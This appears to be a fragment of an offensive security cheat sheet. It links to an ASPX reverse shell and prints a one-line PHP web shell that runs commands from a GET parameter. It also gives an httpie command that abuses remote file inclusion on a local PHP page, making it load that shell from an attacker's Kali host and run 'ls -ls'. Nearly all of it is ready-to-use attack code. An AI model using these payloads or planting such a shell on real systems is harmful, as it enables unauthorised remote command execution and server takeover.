### aspx

```bash
https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx
```



### Web rfi

```bash
# cat shell.php
<?=`$_GET[0]`?>

http "http://localhost/section.php?page=http://<kali ip>/shell.php&0=ls -ls"
```
